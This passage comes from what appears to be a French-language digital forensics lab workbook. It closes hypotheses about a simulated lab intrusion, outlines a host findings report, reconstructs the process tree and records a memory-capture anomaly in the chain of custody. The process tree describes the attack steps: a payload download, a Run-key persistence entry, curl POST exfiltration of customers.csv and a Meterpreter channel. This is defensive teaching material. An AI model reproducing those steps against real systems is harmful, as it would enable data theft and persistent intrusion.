> **Watch out — ne faites pas basculer H3 vers « infirmée ».** L'absence
> d'event Sysmon 10 n'est une preuve d'absence que si on peut prouver que
> la config Sysmon active logguait bien l'accès à `lsass.exe`. Ce fichier
> de config n'est pas dans le coffre (seul le binaire malveillant l'est).
> Épistémiquement, on ne peut dire que « l'instrumentation disponible n'a
> pas enregistré l'événement » — « non concluante » est le libellé correct.

**Checkpoint :** `hypotheses-endpoint.md` mis à jour avec les 5 verdicts
finalisés et leur justification méthodologique.
**Live run :** ✅ _fait_ — fichier `~/dfir-s1/hypotheses-endpoint.md`
mis à jour avec les 5 verdicts.

---

## 6. Rapport de findings hôte

Rédigez `~/dfir-s1/out/rapport-hote-s2.md` (quelques pages, pas plus — le
scope allégé vise un rapport synthétique, pas exhaustif). Structure
minimale :

1. **Résumé** — un paragraphe : ce qui a été trouvé, en une phrase par
   hypothèse close
2. **Processus suspect identifié** — PID, nom, ligne de commande,
   horodatage de création (§1.1, §1.2, §4.2)
3. **Persistance trouvée** — clé exacte, valeur, existence du fichier
   cible (§3)
4. **Accès aux identifiants** — ce que `kiwi`/mimikatz a montré côté
   mémoire + l'event Sysmon 10 correspondant (§1, §4.2)
5. **Logs clés** — tableau des events Security/Sysmon les plus probants,
   avec horodatage UTC
6. **Tableau de clôture des hypothèses** — copié du §5

**Garde-fou scope S2.** Ne mettez PAS de table ATT&CK consolidée dans ce
rapport — c'est le travail de S4. Mentionnez les techniques impliquées
inline (T1547.001 pour la clé Run, T1041 pour l'exfil) mais sans tableau
exhaustif. Toute conclusion sur le canal C2 doit porter la mention « côté
hôte, à corréler avec le PCAP d'Amir en S3 » pour éviter d'empiéter sur
le périmètre réseau.

**Checkpoint :** rapport rédigé, basé uniquement sur les artefacts
produits cette semaine, périmètre host-only respecté.
**Live run :** ✅ _fait_ — fichier `~/dfir-s1/out/rapport-hote-s2.md`.

---

## 7. Arbre de processus de l'intrusion

Schéma simple (ASCII suffit pour le scope allégé — pas besoin d'un outil
de diagramme dédié), construit à partir de `pstree` (§1.1) recoupé avec
les events Sysmon 1 (§4.2) pour les horodatages :

**Arbre reconstruit depuis Sysmon 1 + 4688 (horodatages UTC 2026-10-07) :**

```
services.exe (PID 664)
 └─ powershell.exe (PID 5668)                        [session admin — baseline]
     ├─ Invoke-WebRequest → invoice_october.exe       [14:09:48 — PowerShell log + Sysmon 11]
     └─ invoice_october.exe (PID 3568, Integrity=High) [15:01:32 — Sysmon 1 + 4688]
         ├─ [écriture registry Run\WindowsUpdate]      [15:05:09 — Sysmon 13]
         ├─ cmd.exe → curl.exe                         [15:05:55 — 4688, POST customers.csv → :8000]
         ├─ [création C:\...\AppData\Roaming\sysupdate.exe]  [15:08:33 — Sysmon 11]
         ├─ cmd.exe → curl.exe                         [15:09:53 — 4688, POST #2]
         ├─ backgroundTaskHost.exe                     [15:05:46 — effet de bord UWP, non malveillant]
         └─ SearchProtocolHost.exe                     [15:08:47 — effet de bord indexeur, non malveillant]
```

**Écarts explicites avec le récit théorique de `semaine-0.md` :**

- **Pas de nœud `sysupdate.exe` exécuté** — le binaire est créé (Sysmon
  11 @15:08:33) mais aucun Sysmon 1 ne l'instancie dans la fenêtre
  observée. La persistance n'est jamais déclenchée (cohérent avec H2
  « non armée »).
- **Pas de nœud d'accès `lsass.exe`** — Sysmon 10 = 0, mémoire du 10-10
  non exploitable. Noté comme « H3 non concluante » plutôt qu'inventé.
- **Parent = `powershell.exe`, pas `explorer.exe`** — le récit S0 §9.2
  parlait de « double-clic » mais utilisait en pratique `Start-Process`,
  cohérent avec ce qu'on observe.
- **Pas de nœud Meterpreter visible** — l'injection reflective de
  Meterpreter dans le process `invoice_october.exe` lui-même ne crée pas
  de nouveau nœud Sysmon 1 ; le comportement est capturé par les Sysmon 3
  (connexions `:4444`) et par les enfants `cmd.exe → curl.exe`.

**Checkpoint :** arbre rempli avec PID et horodatages réels, écarts avec
le déroulé théorique notés explicitement.
**Live run :** ✅ _fait_ — fichier `~/dfir-s1/out/arbre-processus.md`.

---

## 8. Livrables + sign-off S2 (partie A)

- [x] **(A)** Sorties Volatility (pslist, pstree, cmdline, netscan,
      malfind) — §1 ; anomalie `.vmem` du 10-10 documentée en §1.5
- [x] **(A)** Fichiers clés du profil utilisateur localisés et horodatés
      via exploration CLI directe (écart assumé vs Autopsy GUI) — §2
- [x] **(A)** Clé Run inspectée + divergence Sysmon/ruche documentée — §3
- [x] **(A)** 5 journaux `.evtx` extraits et events clés identifiés — §4
- [x] **(A)** Tableau de clôture H1–H5 — §5
- [x] **(A)** Rapport findings hôte — §6 (`~/dfir-s1/out/rapport-hote-s2.md`)
- [x] **(A)** Arbre de processus de l'intrusion — §7 (`~/dfir-s1/out/arbre-processus.md`)
- [ ] **(A)** Ligne d'anomalie `.vmem` ajoutée à la custody du coffre
      (voir §9 ci-dessous)

Signé par : `A ____________________` le `__________`.

---

## 9. Note d'anomalie à ajouter à la custody du coffre

À ajouter à `rhel-wazuh:~/dfir-wk0-vault/evidence/README.md`, en complément
de la ligne de copie S1 déjà écrite en `semaine-1.md` §4.

**Nouvelle ligne de custody :**

| Date/Heure (UTC) | Qui | Action | Détails |
|-------------------|-----|--------|---------|
| `2026-10-11T22:00:00Z` | A (Oussama) | Audit S2 — anomalie de collecte identifiée | Analyse du `04-memory/WKSTN01-3f1f74a8.vmem` montre ~78 processus Windows standards tous horodatés 2026-10-10, aucune trace du binaire malveillant, aucune connexion vers `192.168.100.30`. Croisement PCAP (`capinfos`), alertes Wazuh (`jq`), `attack.log` et `strings` sur le `.vmem` confirment : le fichier mémoire scellé provient d'un suspend du 10-10, pas de la fenêtre d'attaque du 07-10. Cause probable : chaque resume+suspend requis par `semaine-0.md` §10.3 pour l'export `.evtx` a produit un nouveau `.vmem` au même chemin, écrasant celui de la fenêtre d'attaque. **Pas d'altération post-scellement : hash MANIFEST OK.** Disque + EVTX restent de la fenêtre d'attaque (Prefetch, MFT, Sysmon horodatés 07-10) et sont exploitables. |

**Nouveau paragraphe à ajouter en bas du README (après la note de
correction administrative Aladine→Amir) :**

> **Note d'anomalie de collecte (`.vmem` 10-10 vs attaque 07-10).**
> L'audit S2 (2026-10-11) a établi que le fichier mémoire
> `04-memory/WKSTN01-3f1f74a8.vmem` du coffre, bien que correctement
> hashé et scellé en S0, ne correspond pas à la capture mémoire de la
> fenêtre d'attaque. Les resume+suspend successifs de WKSTN01 entre le
> 07-10 et le 10-10 (requis par `semaine-0.md` §10.3 pour l'export des
> `.evtx` après la fenêtre d'attaque) ont écrasé la mémoire d'origine ;
> le `.vmem` conservé reflète l'état système au dernier suspend (10-10).
> **Il n'y a pas eu d'altération post-scellement — la chaîne de custody
> reste intègre, le MANIFEST reste valide.** L'investigation host (H1,
> H2, H4, H5) a pu être conduite depuis le disque et les EVTX qui, eux,
> couvrent bien la fenêtre d'attaque. Seule H3 (accès LSASS) perd son
> outil principal (`malfind`/`pstree` sur la mémoire au moment de
> l'attaque) et est en conséquence marquée « non concluante » plutôt
> qu'« infirmée ». Précaution pour les futurs projets : capturer le
> `.vmem` *avant* tout cycle resume/suspend subséquent, ou le promouvoir
> immédiatement sous un nom horodaté qui empêche l'écrasement.

**Checkpoint :** README du coffre à jour avec la ligne d'anomalie et le
paragraphe explicatif ; `sha256sum --check` du coffre toujours `0 FAILED`
après édition (le README n'est pas dans le MANIFEST).
**Live run :** ⬜ _pending_ — à faire en toute dernière étape de S2.

*(Les livrables de B — rapport réseau/triage malware — sont suivis dans
le document d'Amir, pas ici.)*

---

## Quick Reference

| Chose                         | Valeur                                                   |
|---------------------------------|-------------------------------------------------------------|
| VM d'analyse                   | `ANALYST01` — `sansforensics@192.168.100.50`                |
| Evidence locale                | `~/dfir-s1/evidence/` (vérifiée 40/40 OK en S1)              |
| Mémoire                        | `04-memory/WKSTN01-<hex>.vmem` (~2.9 Go)                     |
| Disque (point d'entrée Autopsy)| `05-disk/WKSTN01-000001.vmdk`                                |
| Logs Windows                   | `06-evtx/{Security,System,Application,Sysmon,PowerShell}.evtx` |
| Alertes Wazuh                  | `07-wazuh/wk0-alerts.json`                                   |
| Compte local WKSTN01           | `WKSTN01` (pas `analyst`, pas `Administrator`)                |
| Volatility 3                   | commande `vol`, plugins `windows.<nom>.<Classe>`             |
| EvtxECmd (équivalent SIFT)     | `evtx_dump.py` (package `python-evtx` ; **bien `.py`**)       |
| Regex de comptage EventID      | `grep -cE "<EventID[^>]*>N</EventID>"` (`[^>]*` indispensable) |
| Partition C: sur `nbd0`        | `/dev/nbd0p3` (UEFI 4 partitions, pas MBR 2 partitions)       |
| Fix permissions Volatility     | `sudo chown -R sansforensics:sansforensics /opt/volatility3/lib/python3.12/site-packages/volatility3/symbols/` |
| Sorties A                      | `~/dfir-s1/out/memory/`, `~/dfir-s1/out/evtx/`, `~/dfir-s1/out/rapport-hote-s2.md` |
| Hypothèses à clore             | `~/dfir-s1/hypotheses-endpoint.md` (H1–H5)                    |

---

## Appendix A — Commandes Volatility 3 (référence rapide)

```bash
MEM=~/dfir-s1/evidence/04-memory/WKSTN01-<hex>.vmem

vol -f "$MEM" windows.pslist.PsList
vol -f "$MEM" windows.pstree.PsTree
vol -f "$MEM" windows.cmdline.CmdLine
vol -f "$MEM" windows.netscan.NetScan
vol -f "$MEM" windows.malfind.Malfind
```

---

## Appendix B — Démontage propre de l'image disque

À faire une fois l'analyse Autopsy terminée, pour libérer le périphérique
`nbd` (utile si vous devez remonter une image différente ensuite) :

```bash
sudo umount /mnt/wkstn01
sudo qemu-nbd --disconnect /dev/nbd0
```
